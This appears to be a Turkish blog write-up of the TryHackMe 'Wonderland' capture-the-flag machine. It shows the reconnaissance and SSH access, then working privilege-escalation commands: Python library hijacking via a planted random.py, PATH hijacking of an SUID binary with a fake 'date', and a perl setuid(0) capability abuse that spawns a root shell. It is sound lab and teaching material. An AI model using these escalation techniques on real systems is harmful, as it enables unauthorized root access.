---
title: "THM Wonderland Write Up"
date: 2020-10-08T12:39:20+03:00
draft: false
toc: true
images:
tags: [Tryhackme,write-up,Cap,steghide,ctf,suid,Library Hijacking] 
categories: [write-up]
author : "Barcode"
Description : "Merhaba, Bu yazımda sizlere Tryhackme'de yer alan orta seviye zorluktaki [Wonderland](https://tryhackme.com/room/wonderland) adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar..."
cover : images/thm/wonderland/cover.png
  
---

Merhaba, Bu yazımda sizlere Tryhackme'de yer alan orta seviye zorluktaki [Wonderland](https://tryhackme.com/room/wonderland) adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar...

## 1. Keşif Aşaması

Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.

```bash
sudo nmap -sV -sC 10.10.248.80
```

{{< image src="/images/thm/wonderland/nmap.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Sistemde sadece 2 port açıktır. Web sayfasına giriş yapılır.

{{< image src="/images/thm/wonderland/web1.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Gobuster aracı ile dizin taraması yapılır. 3 adet dizin tespit edilir.

```bash
gobuster dir -u http://10.10.248.80/ -w /usr/share/wordlists/dirb/big.txt 
```

{{< image src="/images/thm/wonderland/gobuster1.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

/img dizine girilir. Dizindeki tüm resim dosyaları indirilir. 

{{< image src="/images/thm/wonderland/img.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

**steghide** aracı ile resimler içerisine gizlenmiş olan dosyalar tespit edilir. Yapılan kontrolde white_rabbit.jpg dosyası içerisinde hint.txt adlı bir dosya gizlenmiştir.

{{< image src="/images/thm/wonderland/steg.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Dosya içeriğine bakıldığında tavşanı takip etmemiz söyleniyor. :rabbit2: 

{{< image src="/images/thm/wonderland/hint.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

***/r*** dizin içeriği görüntülenir. Daha dizin içerisinde gobuster ile dizin taramasına devam edilir.

{{< image src="/images/thm/wonderland/r.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

```bash
gobuster dir -u http://10.10.248.80/r/ -w /usr/share/wordlists/dirb/big.txt
```

{{< image src="/images/thm/wonderland/gobuster2.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

***/r*** dizini içerisinde ***/a*** dizini tespit edilir. İpucunda olan tavşan mevzusunun ne olduğu anlaşılır.:bulb:Tarayıcından ***http://ipadresi/r/a/b/b/i/t*** adresine istek atılır.

{{< image src="/images/thm/wonderland/rabbit.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Sayfa kaynak kodları incelendiğinde gizli bir bilgi tespit edilmektedir. 

{{< image src="/images/thm/wonderland/ssh.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

## 2. Erişim Sağlanması

Elde edilen bilgi herhangi bir login paneli tespit edilmediğinde ssh bağlantısı için kullanılır.

```bash
ssh alice@10.10.248.80
```
{{< image src="/images/thm/wonderland/ssh1.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

## 3. Yetki Yükseltme

`Sudo -l` ile kullanıcının yetkileri kontrol edilir. Rabbit kullanıcısı yetkisi ile *walrus_and_the_carpenter.py* dosyası çalıştırılmaktadır. 

{{< image src="/images/thm/wonderland/sudo.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

walrus_and_the_carpenter.py içeriğine bakıldığında poem değişkeni içerisinde yer alan metinden rastgele belirlenen 10 satır ekrana basılmaktadır. 

{{< image src="/images/thm/wonderland/py.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Rabbit kullanıcısına Hijacking Python Library tekniği ile geçilir. Aynı dizinde random.py adında dosya oluşturulur. İçerisine çalıştırmak istediğimiz kodlar yazılır. Uygulama çalıştığında random kütüphanesi import edilirken bizim yazdığımız kodlar import edilecektir. 

```python
import os
os.system("/bin/bash)
```
```bash
sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```
Rabbit kullanısının home dizine geçilerek dosyalar listelenir. Suid biti aktif olan ***teaParty*** adında bir dosya görülmektedir.

{{< image src="/images/thm/wonderland/rabbito.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Dosya çalıştırıldığında Hatter'ın partiye geleceği bilgisi ekrana basılmakta ve uygulama kullanıcıdan girdi beklemektedir. Herhangi bir tuşa basınca ekrana Segmentation Fault yazdırılmaktadır. 

```terminal
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Wed, 07 Oct 2020 20:06:29 +0000
Ask very nicely, and I will give you some tea while you wait for him
ls
Segmentation fault (core dumped)
```

Binary ayrıntılı incelenmek üzere locale indirilir. Daha sonra Ghidra ile analiz edilir. 

{{< image src="/images/thm/wonderland/ghidra.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Setuid(0x3eb) ve setguid(0x3eb) ile uid değeri Hatter (1003) kullanıcısına set edilir. Burada dikkat çeken echo ve date komutlarının çalıştırılmasıdır. Echo komutu için tam yol belirtilirken, date komutu için path belirtilmemiştir. Date komutu PATH değişkeninde tanımalanan dizinlerde sıra ile aranmaktadır.

1. *Date dosyası oluşturulur.*
2. *Date dosya dizini PATH değişkenine eklenir.*

```bash
rabbit@wonderland:/home/rabbit$ echo /bin/bash > date
rabbit@wonderland:/home/rabbit$ chmod 777 date
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit/:$PATH
```

Dosya çalıştırılarak ***hatter*** kullanıcısına geçiş yapılır. Hatter dizini içeriğine göz atılır.

{{< image src="/images/thm/wonderland/matter.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Password.txt dosyasında yer alan parola bilgisi ile hatter kullanıcısına geçiş yapılır.

```bash
ssh hatter@localhost
```
Hatter kullanıcısı yetkileri ile sistem hakkında bilgi toplamak için LinEnum betiği çalıştırılır. Betik çıktısında capability yetkileri olan dosyalar dikkat çekmektedir.

{{< image src="/images/thm/wonderland/cap.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

Perl uygulamasının *setuid* ile yetkilerinin yükseltilerek kernele sistem çağırısı yapılabilceği tespit edilmektedir. ***uid değeri 0 (root)*** set edilir ve /bin/bash uygulaması çalıştırılır.

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
{{< image src="/images/thm/wonderland/priv.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}

*/root* dizini içerisinde yer alan user.txt dosyası,

{{< image src="/images/thm/wonderland/userflag.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}


 ve */home/alice* dizininde yer alan root.txt dosyaları okunarak makina çözümlemesi tamamlanır.

{{< image src="/images/thm/wonderland/rootflag.png" alt="Hello Friend" position="center" style="border-radius: 10px;" >}}




